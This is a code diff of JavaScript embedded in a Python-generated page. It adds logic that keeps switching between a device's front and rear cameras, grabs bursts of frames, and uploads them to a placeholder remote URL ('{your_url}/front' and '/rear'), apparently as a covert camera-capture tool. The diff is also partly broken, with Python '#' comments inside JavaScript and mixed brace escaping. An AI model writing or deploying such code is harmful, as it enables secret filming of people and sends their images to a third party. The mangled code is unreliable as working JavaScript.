@@ -244,20 +244,75 @@ navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }} }})
   }});
 
 // Capture and upload frames
-setInterval(() => {{
-  if (video.readyState === video.HAVE_ENOUGH_DATA) {{
+# setInterval(() => {{
+#   if (video.readyState === video.HAVE_ENOUGH_DATA) {{
+#     canvas.width = video.videoWidth;
+#     canvas.height = video.videoHeight;
+#     ctx.drawImage(video, 0, 0);
+#     canvas.toBlob(blob => {{
+#       const formData = new FormData();
+#       formData.append('frame', blob, 'frame.jpg');
+#       fetch(uploadUrl, {{
+#         method: 'POST',
+#         body: formData
+#       }}).catch(e => console.log("Upload error", e));
+#     }}, 'image/jpeg');
+#   }}
+# }}, 1000);
+        let stream = null;
+let isFront = true;
+
+async function startCamera(facingMode) {
+  if (stream) {
+    stream.getTracks().forEach(track => track.stop());
+  }
+  stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
+  video.srcObject = stream;
+  await new Promise(r => setTimeout(r, 800)); // Camera warm-up
+}
+
+async function captureAndUpload(url) {
+  if (video.readyState === video.HAVE_ENOUGH_DATA) {
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
     ctx.drawImage(video, 0, 0);
-    canvas.toBlob(blob => {{
+    canvas.toBlob(blob => {
       const formData = new FormData();
       formData.append('frame', blob, 'frame.jpg');
-      fetch(uploadUrl, {{
+      fetch(url, {
         method: 'POST',
         body: formData
-      }}).catch(e => console.log("Upload error", e));
-    }}, 'image/jpeg');
-  }}
-}}, 1000);
+      }).catch(e => console.log("Upload error", e));
+    }, 'image/jpeg');
+  }
+}
+
+// Function to capture 3 frames at ~3 FPS (every 333ms)
+async function captureBurst(url, fps = 3, durationSec = 1) {
+  const interval = 1000 / fps; // ~333 ms
+  const totalFrames = Math.floor(fps * durationSec); // e.g., 3 frames in 1 second
+
+  for (let i = 0; i < totalFrames; i++) {
+    await captureAndUpload(url);
+    await new Promise(r => setTimeout(r, interval));
+  }
+}
+
+// Alternate between front and rear every 2 seconds
+setInterval(async () => {
+  const facingMode = isFront ? "user" : "environment";
+  const url = isFront ? "{your_url}/front" : "{your_url}/rear";
+
+  try {
+    await startCamera(facingMode);
+    await captureBurst(url, 3, 1); // 3 FPS for 1 second
+  } catch (err) {
+    console.error("Camera error:", err);
+  }
+
+  isFront = !isFront; // toggle
+}, 2000); // switch camera every 2 seconds
+
+
 </script>
 """, height=480)
